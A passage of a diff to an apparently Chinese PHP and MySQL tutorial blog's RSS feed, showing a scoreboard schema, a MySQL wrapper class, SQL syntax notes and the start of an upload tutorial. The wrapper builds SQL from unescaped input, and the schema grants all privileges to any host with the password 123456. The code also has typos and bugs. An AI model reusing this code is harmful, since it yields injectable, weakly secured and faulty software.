+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;表设计如下:317ff1eff665d8a9829539f077e44501&#34;&gt;表设计如下&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;create database scoreboard;
+use scoreboard;
+
+create table users(
+id int not null auto_increment primary key,
+gid int not null,                --组id
+username varchar(20) not null,
+password varchar(32) not null,
+sex varchar(2) not null,
+totalscore int  --个人总积分
+);
+
+create table share(
+id int not null auto_increment primary key,
+uid int not null,
+content varchar(1024) not null,  --分享内容
+comment varchar(1024) not null,   --点评
+date varchar(15) not null       --分享日期
+);
+
+create table score(
+id int not null auto_increment primary key,
+uid int not null,               --用户id
+score int not null,             --用户单次积分
+);
+
+grant all privileges on scoreboard.* to &#39;score&#39;@&#39;%&#39; identified by &#39;123456&#39;;
+
+-- 或者只给特定权限
+-- grant select,update,delete on scoreboard.* to &#39;score&#39;@&#39;%&#39; identified by &#39;123456&#39;;
+
+flush privileges;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;封装类如下:317ff1eff665d8a9829539f077e44501&#34;&gt;封装类如下&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;&amp;lt;?php
+
+class mysql {
+    private $logfilepath;
+    private $is_log;
+    private $hlog;
+    private $conn;
+
+    //构造函数
+    public function __construct()
+    {
+        $config = include_once(dirname(__FILE__).&amp;quot;/../config/config.inc.php&amp;quot;);
+        $this-&amp;gt;is_log = $config[&#39;IS_LOG&#39;];
+        $this-&amp;gt;logfilepath = $config[&#39;LOGFILEPATH&#39;];
+
+        if ($this-&amp;gt;is_log){
+            $handle = fopen($this-&amp;gt;logfilepath,&amp;quot;a+&amp;quot;);
+            $this-&amp;gt;hlog = $handle;
+        }
+
+        $this-&amp;gt;conn = $this-&amp;gt;connect($config[&#39;DB_HOST&#39;],$config[&#39;DB_USER&#39;],$config[&#39;DB_PASS&#39;],$config[&#39;DB_NAME&#39;],$config[&#39;DB_CHARSET&#39;]);
+    }
+
+    //连接数据库
+    public function connect($dbhost, $dbuser, $dbpass, $dbname, $dbcharset)
+    {
+        $this-&amp;gt;conn = @mysql_connect($dbhost,$dbuser,$dbpass);
+        if (!$this-&amp;gt;conn) {
+            $msg = &amp;quot;连接数据库失败：&amp;quot;.mysql_error();
+            $this-&amp;gt;write_log($msg);
+            die($msg);
+        } else {
+            if (!@mysql_select_db($dbname)) {
+                $msg = &amp;quot;连接数据库成功，但选择数据库失败：&amp;quot;.mysql_error();
+                $this-&amp;gt;write_log($msg);
+                die($msg);
+            } else {
+                $msg = &amp;quot;连接数据库成功，且选择数据库成功&amp;quot;;
+                $this-&amp;gt;write_log($msg);
+            }
+        }
+
+        @mysql_query(&amp;quot;set names &amp;quot;.$dbcharset);
+
+    }
+
+    //执行语句
+    public function query($sql){
+        
+        $result = @mysql_query($sql);
+
+        if (!$result) {
+            $this-&amp;gt;write_log(&#39;mysql_query error:&#39;.mysql_error());
+        } else {
+            $this-&amp;gt;write_log(&#39;执行语句：&#39;.$sql.&#39; 且执行成功&#39;);
+        }
+        return $result;
+    }
+
+    //查询一条数据
+    public function select_one($tab,$column = &amp;quot;*&amp;quot;,$condition = &#39;&#39;,$debug=False)   //查询函数
+    {
+        $condition = $condition ? &#39; where &#39; . $condition : NULL;
+        $sql = &amp;quot;select $column from $tab $condition &amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql.&#39;&amp;lt;br /&amp;gt;&#39;;
+        } else {
+            $result = $this-&amp;gt;query($sql);
+            $row = @mysql_fetch_assoc($result);
+            return $row;
+        }
+    }
+
+    //查询多条数据
+    public function select_more($tab,$column = &amp;quot;*&amp;quot;,$condition = &#39;&#39;,$debug=False)   //查询函数
+    {
+        $condition = $condition ? &#39; where &#39; . $condition : NULL;
+        $sql = &amp;quot;select $column from $tab $condition&amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql;
+        } else {
+            $result = $this-&amp;gt;query($sql);
+            $i = 0;
+            $rows = array();
+            while ($row = @mysql_fetch_assoc($result)) {
+                $rows[$i] = $row;
+                // print_r($rows[$i]);
+                $i++; 
+            }
+            return $rows;
+        }
+    }
+
+    //返回结果集
+    public function echo_result($tab,$column = &amp;quot;*&amp;quot;,$condition = &#39;&#39;,$debug=False)   //查询函数
+    {
+        $condition = $condition ? &#39; where &#39; . $condition : NULL;
+        $sql = &amp;quot;select $column from $tab $condition &amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql.&#39;&amp;lt;br /&amp;gt;&#39;;
+        } else {
+            return $this-&amp;gt;query($sql);
+        }
+    }
+
+    //插入数据
+    public function insert($tab,$arr,$debug=False)
+    {
+        $value = &#39;&#39;;
+        $column = &#39;&#39;;
+        foreach ($arr as $k =&amp;gt; $v) {
+            $column .= &amp;quot;,{$k}&amp;quot;;
+            $value .= &amp;quot;,&#39;{$v}&#39;&amp;quot;;
+        }
+        $column = substr($column, 1);
+        $value = substr($value, 1);
+
+        $sql = &amp;quot;insert into $tab($column) values($value)&amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql;
+        } else {
+            $this-&amp;gt;query($sql);
+            $num = $this-&amp;gt;affected_num();
+            $this-&amp;gt;write_log(&amp;quot;受影响行数：&amp;quot;.$num);
+            return $num;    //返回受影响行数
+        }
+    }
+
+    //获取最后插入的id
+    public function insert_id() {
+        $id = mysql_insert_id($this-&amp;gt;link_id);
+        $this-&amp;gt;write_log(&#39;最后插入的id为：&#39;.$id);
+        return $id;
+    }
+
+    //更新数据
+    public function update($tab,$arr,$condition = &#39;&#39;,$debug=False)
+    {
+        if (!$condition) {
+            die(&amp;quot;error&amp;quot;.mysql_error());
+        } else {
+            $condition = &#39;where &#39; . $condition;
+        }
+        
+        $value = &#39;&#39;;
+        foreach ($arr as $k =&amp;gt; $v) {
+            $value .= &amp;quot;{$k}=&#39;{$v}&#39;,&amp;quot;;
+        }
+        $value = substr($value,0,-1);
+
+        $sql = &amp;quot;update $tab set $value $condition&amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql;
+        } else {
+            $this-&amp;gt;query($sql);
+            $num = $this-&amp;gt;affected_num();
+            $this-&amp;gt;write_log(&amp;quot;受影响行数：&amp;quot;.$num);
+
+            return $num;            
+        }
+    }
+
+    //删除数据
+    public function delete($tab,$condition=&#39;&#39;,$debug=False)
+    {
+        $condition = $condition ? &#39; where &#39; . $condition : NULL;
+        $sql = &amp;quot;delete from $tab $condition&amp;quot;;
+        if ($debug) {
+            echo &#39;将执行语句：&#39;.$sql;
+        } else {
+            $this-&amp;gt;query($sql);
+            $num = $this-&amp;gt;affected_num();
+            $this-&amp;gt;write_log(&amp;quot;受影响行数：&amp;quot;.$num);
+            return $num;    //返回受影响行数
+        }
+    }
+
+    //返回受影响行数
+    public function affected_num()
+    {
+        $num = @mysql_affected_rows();
+        return $num;
+    }
+
+    //写入日志
+    public function write_log($msg=&#39;&#39;)
+    {
+        if ($this-&amp;gt;is_log){
+            $text = date(&amp;quot;Y-m-d H:i:s&amp;quot;).&amp;quot; &amp;quot;.$msg.&amp;quot;\r\n&amp;quot;;
+            fwrite($this-&amp;gt;hlog,$text);
+        }
+    }
+
+    //关闭数据库连接
+    public function close()
+    {  
+        mysql_close($this-&amp;gt;conn);
+    }
+
+    //析构函数
+    public function __destruct()
+    {
+        if($this-&amp;gt;is_log){
+            fclose($this-&amp;gt;hlog);
+        }
+    }
+}
+
+
+    //$db = new mysql();
+    
+    // //select_one($tab,$column = &amp;quot;*&amp;quot;,$condition = &#39;&#39;)
+    // $rows = $db-&amp;gt;select_more(&#39;share&#39;,&#39;*&#39;);
+    // print_r($rows[0]);
+    // print_r($rows[1]);
+
+
+    // //insert($tab,$arr)
+    // $arr = array();
+    // $arr[&#39;uid&#39;] = &#39;3&#39;;
+    // $arr[&#39;content&#39;] = &#39;xss&#39;;
+    // $arr[&#39;comment&#39;] = &#39;very good&#39;;
+    // $arr[&#39;date&#39;] = &#39;1464082630&#39;;
+    // $db-&amp;gt;insert(&#39;share&#39;,$arr);
+
+
+    // //update($tab,$arr,$condition = &#39;&#39;)
+    // $arr = array();
+    // $arr[&#39;content&#39;] = &#39;xssxssxssxssxss&#39;;
+    // $arr[&#39;comment&#39;] = &#39;goodgoodgoodgood&#39;;
+    // $condition = &#39;id &amp;gt; 5&#39;;
+    // $db-&amp;gt;update(&#39;share&#39;,$arr,$condition);
+
+
+    //$db-&amp;gt;delete(&amp;quot;share&amp;quot;,&amp;quot;id between 10 and 15&amp;quot;);
+
+
+    //$db-&amp;gt;close();
+
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之MySQL常用函数</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</link>
+      <pubDate>Thu, 02 Jun 2016 13:21:49 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E5%B8%B8%E7%94%A8%E5%87%BD%E6%95%B0/</guid>
+      <description>
+
+&lt;h2 id=&#34;处理函数:5a754a6f2338ff77c37d8e8e11f32a1d&#34;&gt;处理函数&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;&lt;p&gt;mysql_connect(server,user,pwd,newlink,clientflag)&lt;br /&gt;
+连接服务器的函数,成功则返回MySQL标识，失败则返回FALSE&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_select_db(database,connection)&lt;br /&gt;
+选择数据库的函数，成功则返回true，失败则返回false&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_query(query,connection)&lt;br /&gt;
+执行一条查询，返回一个资源标识符(结果集)，如果查询执行不正确则返回FALSE&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_num_rows(data)和mysql_num_fields(data)&lt;br /&gt;
+函数分别返回结果集中行和列的数目(禁对SELECT语句有效),结果集从 mysql_query()的调用中得到&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_fetch_assoc(data)&lt;br /&gt;
+从结果集中取得一行作为关联数组，若没有更多行则返回false&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_fetch_row(data)&lt;br /&gt;
+从结果集中取得一行作为索引数组，若没有更多行则返回false&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_error(connection)&lt;br /&gt;
+返回上一个MySQL函数的错误文本，如果没有出错则返回&amp;rdquo;(空字符串)&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_affected_rows(link_identifier)&lt;br /&gt;
+返回前一次MySQL操作(增删改)所影响的记录行数,失败则返回-1&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_insert_id(connection)&lt;br /&gt;
+返回上一步INSERT操作产生的 ID。如果上一查询没有产生AUTO_INCREMENT的ID，则mysql_insert_id()返回 0。&lt;/p&gt;&lt;/li&gt;
+
+&lt;li&gt;&lt;p&gt;mysql_data_seek(data,row)&lt;br /&gt;
+结果集data从mysql_query()的调用中得到,行指针移动到指定的行号，接着调用 mysql_fetch_row() 将返回那一行。如果成功则返回 true，失败则返回 false&lt;/p&gt;&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;例子:5a754a6f2338ff77c37d8e8e11f32a1d&#34;&gt;例子&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    $server = &amp;quot;127.0.0.1&amp;quot;;
+    $dbname = &amp;quot;massage&amp;quot;;
+    $user = &amp;quot;msg&amp;quot;;
+    $pass = &amp;quot;123456&amp;quot;
+
+    $conn = mysql_connect($server,$user,$pass) or die(&#39;连接服务器失败:&#39;.mysql_error());
+    mysql_query(&amp;quot;set names &#39;utf8&#39;&amp;quot;);//设置数据库输出编码
+    mysql_select_db($dbname,$conn) or die(mysql_error($conn)); //选择数据库
+
+    $sql = &amp;quot;select username,password from user&amp;quot;;   //构造sql语句
+    $result = mysql_query($sql);  //执行sql语句，返回结果集
+
+    $num = mysql_num_rows($result);//返回执行结果的行数
+    echo &amp;quot;&amp;lt;br /&amp;gt;结果的行数:{$num}&amp;lt;br /&amp;gt;&amp;quot;;
+
+    while ($row = mysql_fetch_assoc($result)) {
+        echo $row[id].&amp;quot;:&amp;quot;.$row[username].&amp;quot;&amp;lt;br /&amp;gt;&amp;quot;;
+    }
+
+    $sql = &amp;quot;insert into user(username,password) values(&#39;3333&#39;,&#39;mm3333&#39;)&amp;quot;;
+    mysql_query($sql);
+    echo &amp;quot;受影响行数：&amp;quot;.mysql_affected_rows().&amp;quot;最后一次插入的id为：&amp;quot;.mysql_insert_id();
+
+    mysql_free_result($result);  //释放结果内存
+    mysql_close($conn);  //关闭非持久的MySQL连接
+?&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之MySQL语法</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E8%AF%AD%E6%B3%95/</link>
+      <pubDate>Thu, 02 Jun 2016 11:19:05 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E8%AF%AD%E6%B3%95/</guid>
+      <description>
+
+&lt;h2 id=&#34;select语句的一般语法:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;Select语句的一般语法&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;1.SELECT [ALL|DISTINCT] &amp;lt;目标列表达式&amp;gt; [,&amp;lt;目标列表达式&amp;gt; ]...
+2.FROM &amp;lt;表名或视图名&amp;gt; [,&amp;lt;表名或视图名&amp;gt; ]...
+3.[ WHERE &amp;lt;行条件表达式&amp;gt; ]
+4.[ GROUP BY &amp;lt;列名1&amp;gt; ,[列名2][,...][HAVING组条件表达式] ]
+5.[ ORDER BY &amp;lt;列名1&amp;gt; ,[ASC|DESC][,...] ];
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;上面5个句子书写时按顺序，尽量一个句子一行，但在机器内部执行时的顺序是2-3-4-1-5，&lt;br /&gt;
+即先确定从哪个数据源查找，&lt;br /&gt;
+然后确定过滤条件，&lt;br /&gt;
+若有分组则对过滤后的记录进行分组，若分组有限制条件则对分组进一布限制，&lt;br /&gt;
+然后将符合条件的列查询出来，&lt;br /&gt;
+最后对结果进行排序。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;select name as &#39;名字&#39;,password as &#39;密码&#39; form user;
+select * from message where id between 2 and 6;
+select * from message where title like &#39;%留言_&#39;;  //%匹配任意个字符,_匹配一个字符
+select * from message where uid in (2,3,4); //删除2、3、4共3条数据
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;连接查询:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;连接查询&lt;/h2&gt;
+
+&lt;p&gt;&lt;code&gt;[&amp;lt;表名1&amp;gt;.][&amp;lt;列名1&amp;gt;]  &amp;lt;比较运算符&amp;gt;  [&amp;lt;表名2&amp;gt;.][&amp;lt;列名2&amp;gt;]&lt;/code&gt;&lt;br /&gt;
+&lt;code&gt;[&amp;lt;表名1&amp;gt;.][&amp;lt;列名1&amp;gt;]  BETWEEN  [&amp;lt;表名2&amp;gt;.][&amp;lt;列名2&amp;gt;] AND [&amp;lt;表名2&amp;gt;.][&amp;lt;列名3&amp;gt;]&lt;/code&gt;&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;select * from user,msg where user.id=msg.uid;
+select m.id,m.title &#39;标题&#39;,m.ip,u.username &#39;名字&#39; from message as m,user as u where m.uid=u.id;
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;子查询:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;子查询&lt;/h2&gt;
+
+&lt;p&gt;一个SELECT-FROM-WHERE语句成为一个查询块。&lt;br /&gt;
+将一个查询块嵌套到另外一个查询块的WHERE子句或HAVING短句条件中的查询成为子查询或嵌套查询，它允许我们根据另一个查询的结果检索数据。&lt;br /&gt;
+子查询的方法是由里向外处理，即每个子查询在其上一级查询之前查询，子查询的结果用于建立其副查询的查询条件。&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;select *
+from message
+where id in (
+    select id
+        from users
+        where username=&#39;admin&#39;
+    );
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;集合查询:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;集合查询&lt;/h2&gt;
+
+&lt;p&gt;集合的并操作：使用UNION运算符经多个SELECT查询结果合并起来，形成一个完整的查询结果，系统合并时会自动去掉重复的元组。&lt;br /&gt;
+注意：前后SELECT语句查询的列数要相同。&lt;/p&gt;
+
+&lt;h2 id=&#34;数据更新:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;数据更新&lt;/h2&gt;
+
+&lt;ol&gt;
+&lt;li&gt;插入数据
+
+&lt;ul&gt;
+&lt;li&gt;插入单个元组：&lt;br /&gt;
+INSERT INTO &amp;lt;表名&amp;gt; [(&amp;lt;属性列1&amp;gt;[,&amp;lt;属性列2&amp;gt;&amp;hellip;])]&lt;br /&gt;
+VALUES (&amp;lt;常量1&amp;gt;[,&amp;lt;常量2&amp;gt;]&amp;hellip;);&lt;br /&gt;&lt;/li&gt;
+&lt;li&gt;通过子查询向表中插入多条数据&lt;br /&gt;
+INSERT INTO &amp;lt;表名&amp;gt; [(&amp;lt;属性列1&amp;gt;[,&amp;lt;属性列2&amp;gt;&amp;hellip;])]&lt;br /&gt;
+SELECT [(&amp;lt;属性列1&amp;gt;[,&amp;lt;属性列2&amp;gt;&amp;hellip;])]&lt;br /&gt;
+FROM &amp;lt;表名&amp;gt;&lt;br /&gt;
+[WHERE 子句]&lt;br /&gt;
+[GROUP BY 子句]&lt;br /&gt;
+[ORDER BY 子句];&lt;/li&gt;
+&lt;li&gt;通过SELECT INTO语句创建新表并插入多条数据&lt;br /&gt;
+SELECT &amp;lt;列名1&amp;gt;,&amp;lt;列名2&amp;gt;,&amp;hellip;&amp;lt;表达式1&amp;gt; as &amp;lt;别名1&amp;gt;,&amp;hellip;INTO &amp;lt;表名&amp;gt;&lt;br /&gt;
+FROM &amp;lt;表名1&amp;gt;，&amp;lt;表名2&amp;gt;,&amp;hellip;&lt;br /&gt;
+[WHERE 条件表达式]&lt;br /&gt;
+[GROUP BY 子句]&lt;br /&gt;
+[ORDER BY 子句];&lt;/li&gt;
+&lt;/ul&gt;&lt;/li&gt;
+&lt;li&gt;修改数据&lt;br /&gt;
+UPDATE &amp;lt;表名&amp;gt;&lt;br /&gt;
+SET &amp;lt;列名1&amp;gt; = &amp;lt;表达式1&amp;gt; [,&amp;lt;列名2&amp;gt; = &amp;lt;表达式2&amp;gt;]&amp;hellip;&lt;br /&gt;
+[WHERE &amp;lt;条件&amp;gt;];&lt;/li&gt;
+&lt;li&gt;删除数据&lt;br /&gt;
+DELETE&lt;br /&gt;
+FROM &amp;lt;表名&amp;gt;&lt;br /&gt;
+[WHERE &amp;lt;条件&amp;gt;]&lt;/li&gt;
+&lt;/ol&gt;
+
+&lt;h2 id=&#34;sql的数据控制功能:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;SQL的数据控制功能&lt;/h2&gt;
+
+&lt;p&gt;授权语句&lt;/p&gt;
+
+&lt;pre&gt;&lt;code&gt;GRENT &amp;lt;权限1&amp;gt;，[,&amp;lt;权限2&amp;gt;]...  
+[ON &amp;lt;对象名&amp;gt;]  
+TO &amp;lt;用户1&amp;gt;[,&amp;lt;用户2&amp;gt;],  
+[WITH GRANT OPTION];
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;p&gt;创建用户blog，设密码为666666,并将数据库db_blog的所有权限赋给他&lt;br /&gt;
+grant all privileges on db_blog.* to blog@localhost identified by &amp;lsquo;666666&amp;rsquo;;&lt;/p&gt;
+
+&lt;h2 id=&#34;order-by和limit:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;order by和limit&lt;/h2&gt;
+
+&lt;pre&gt;&lt;code&gt;select * from message order by uid desc;
+select * from message order by uid desc limit 5; //默认从0开始，查询5条数据
+select * from message order by uid desc limit 2,4;  //从第2条开始查询4条数据
+&lt;/code&gt;&lt;/pre&gt;
+
+&lt;h2 id=&#34;统计函数:eb5ec6957cb8641e808ae6e4825cc16d&#34;&gt;统计函数&lt;/h2&gt;
+
+&lt;p&gt;count()&lt;br /&gt;
+sum()&lt;br /&gt;
+avg()&lt;br /&gt;
+max()&lt;br /&gt;
+min()&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之MySQL简单操作</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</link>
+      <pubDate>Sun, 29 May 2016 22:50:52 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8BMySQL%E7%AE%80%E5%8D%95%E6%93%8D%E4%BD%9C/</guid>
+      <description>
+
+&lt;h2 id=&#34;连接数据库:e48807970ba47940fe20d73596b3932d&#34;&gt;连接数据库&lt;/h2&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/con_mysql.png&#34; alt=&#34;连接数据库.png&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;h2 id=&#34;查看数据库:e48807970ba47940fe20d73596b3932d&#34;&gt;查看数据库&lt;/h2&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/show_databases.png&#34; alt=&#34;查看数据库&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;h2 id=&#34;创建数据库:e48807970ba47940fe20d73596b3932d&#34;&gt;创建数据库&lt;/h2&gt;
+
+&lt;p&gt;一般将sql语句保存在文本中，然后复制运行&lt;/p&gt;
+
+&lt;pre&gt;&lt;code class=&#34;language-sql&#34;&gt;create database test;
+use test;
+
+create table users(
+id int not null auto_increment primary key,
+username varchar(20) not null,
+password varchar(32) not null
+);
+
+create table msg(
+id int not null auto_increment primary key,
+uid int not null,
+title varchar(30) not null,
+content varchar(1024) not null,
+ip varchar(15) not null,
+date int(15) not null
+);
+&lt;/code&gt;&lt;/pre&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/create_database_table.png&#34; alt=&#34;创建数据库&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;h2 id=&#34;插入数据:e48807970ba47940fe20d73596b3932d&#34;&gt;插入数据&lt;/h2&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_insert.png&#34; alt=&#34;插入数据&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;h2 id=&#34;查看数据:e48807970ba47940fe20d73596b3932d&#34;&gt;查看数据&lt;/h2&gt;
+
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_select.png&#34; alt=&#34;查看数据&#34;&gt;
+&lt;/div&gt;
+
+
+&lt;h2 id=&#34;删除数据:e48807970ba47940fe20d73596b3932d&#34;&gt;删除数据&lt;/h2&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_delete.png&#34; alt=&#34;删除数据&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&#34;更新数据:e48807970ba47940fe20d73596b3932d&#34;&gt;更新数据&lt;/h2&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_update.png&#34; alt=&#34;更新数据&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+
+&lt;h2 id=&#34;更改数据库结构:e48807970ba47940fe20d73596b3932d&#34;&gt;更改数据库结构&lt;/h2&gt;
+
+&lt;p&gt;
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_alter.png&#34; alt=&#34;添加一列&#34;&gt;
+&lt;/div&gt;
+
+&lt;br /&gt;&amp;nbsp;
+
+&lt;div class=&#34;pure-u-1&#34;&gt;
+  &lt;img class=&#34;pure-img&#34; src=&#34;http://wyb0.com/img/post/mysql_drop.png&#34; alt=&#34;删除一个表&#34;&gt;
+&lt;/div&gt;
+&lt;/p&gt;
+</description>
+    </item>
+    
+    <item>
+      <title>PHP之上传与下载</title>
+      <link>http://wyb0.com/posts/PHP%E4%B9%8B%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD/</link>
+      <pubDate>Tue, 24 May 2016 08:31:09 +0800</pubDate>
+      
+      <guid>http://wyb0.com/posts/PHP%E4%B9%8B%E4%B8%8A%E4%BC%A0%E4%B8%8E%E4%B8%8B%E8%BD%BD/</guid>
+      <description>
+
+&lt;h2 id=&#34;上传:cf817d8c79d597602d7618c4a1130c46&#34;&gt;上传&lt;/h2&gt;
+
+&lt;h3 id=&#34;客户端设置:cf817d8c79d597602d7618c4a1130c46&#34;&gt;客户端设置&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;客户端使用form表单上传文件，在form表单中必须指明enctype和method属性的值&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-html&#34;&gt;&amp;lt;html&amp;gt;
+&amp;lt;head&amp;gt;
+    &amp;lt;title&amp;gt;post&amp;lt;/title&amp;gt;
+&amp;lt;/head&amp;gt;
+&amp;lt;body&amp;gt;
+    &amp;lt;form action=&amp;quot;xx.php&amp;quot; mothod=&amp;quot;post&amp;quot; enctype=&amp;quot;multipart/form-data&amp;quot;&amp;gt;
+        &amp;lt;input type=&amp;quot;file&amp;quot; value=&amp;quot;myfile&amp;quot; /&amp;gt;&amp;lt;br /&amp;gt;
+        &amp;lt;input type=&amp;quot;submit&amp;quot; value=&amp;quot;提交&amp;quot; /&amp;gt;
+    &amp;lt;/form&amp;gt;
+&amp;lt;/body&amp;gt;
+&amp;lt;/html&amp;gt;
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;h3 id=&#34;服务端设置:cf817d8c79d597602d7618c4a1130c46&#34;&gt;服务端设置&lt;/h3&gt;
+
+&lt;ul&gt;
+&lt;li&gt;php.ini:&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;file_uploads = On   //默认允许HTTP文件上传，此选项不能设置为OFF
+upload_tmp_dir=    //文件上传时存放文件的临时目录
+upload_max_filesize = 20M   //设定单个文件上传的大小，必须小于post_max_size
+post_max_size = 19M   //允许POST表单的数据最大大小
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;$_FILES:&lt;br /&gt;&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;$_FILES[&#39;upload_file&#39;][&#39;name&#39;]  //带扩展名的原始文件名
+$_FILES[&#39;upload_file&#39;][&#39;size&#39;]  //文件大小
+$_FILES[&#39;upload_file&#39;][&#39;tmp_name&#39;]  //临时文件名
+$_FILES[&#39;upload_file&#39;][&#39;error&#39;]  //上传文件时的错误信息
+$_FILES[&#39;upload_file&#39;][&#39;type&#39;]  //上传文件的类型
+
+//type是上传文件时原始信息里的content_type,即MIME,有image/gig、text/html等
+//error一般有5中类型：
+//0 上传成功
+//1 文件大小超过了upload_max_filesize
+//2 文件大小超过了表单总MAX_FILE_SIZE设定的值
+//3 只有部分被上传
+//4 没有上传任何文件
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;服务端上传步骤&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code&gt;1. 判断uploads这个文件夹存在
+2. 判断error的值
+3. 判断文件后缀是否合法
+4. 判断MIME的类型和子类型是否合法
+5. 判断文件大小
+6. 对文件进行重命名
+7. 移动
+&lt;/code&gt;&lt;/pre&gt;
+&lt;/blockquote&gt;
+
+&lt;ul&gt;
+&lt;li&gt;服务端接收脚本&lt;/li&gt;
+&lt;/ul&gt;
+
+&lt;blockquote&gt;
+&lt;pre&gt;&lt;code class=&#34;language-php&#34;&gt;&amp;lt;?php
+    //执行文件（图片）上传
+    echo &amp;quot;&amp;lt;pre&amp;gt;&amp;quot;;
+    var_dump($_FILES);
+    echo &amp;quot;&amp;lt;/pre&amp;gt;&amp;quot;;
+
+    //1.获取上传文件信息
+     $upfile = $_FILES[&amp;quot;pic&amp;quot;]; //html的form表单的input中name属性值要为pic
+     $typelist = array(&amp;quot;image/jpeg&amp;quot;,&amp;quot;image/jpg&amp;quot;,&amp;quot;image/png&amp;quot;,&amp;quot;image/gif&amp;quot;); //定义允许的类型
+     $path=&amp;quot;./uploads/&amp;quot;;  //定义一个上传过后的目录
+
